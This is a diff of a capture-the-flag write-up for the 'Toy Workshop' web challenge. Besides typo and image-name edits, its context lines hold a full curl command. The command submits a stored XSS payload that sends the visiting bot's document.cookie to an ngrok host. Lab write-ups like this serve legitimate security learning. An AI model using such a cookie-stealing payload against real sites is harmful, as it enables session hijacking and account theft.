@@ -2,7 +2,7 @@
 ### Challenge Name: Toy Workshop
 
 #### Challenge Prompt:
-`he work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?`
+`The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?`
 
 #### Walkthrough:
 This challenge has both a downloadable part and a docker service to accompany it. Download the challenge archive and extract it to see it's a node webserver.  
@@ -38,4 +38,4 @@ Now lets try an attack from a really useful resource over at https://0xhorizon.e
 
 Inserting this into our curl command gives us the following complete payload:
 `curl -H "Content-Type: application/json" -d '{"query": "<script>document.location.replace(\"http://2774-2601-602-87f-9853-7df0-274a-fd62-32ae.ngrok.io?cookie=\"+document.cookie)</script>"}' -X POST 138.68.184.31:30881/api/submit` Execute this payload and wait a couple of seconds and the flag should show in the terminal tab with ngrok:
-![[Pasted image 20211202182728.png]]
+![[flag_ngrok.png]]
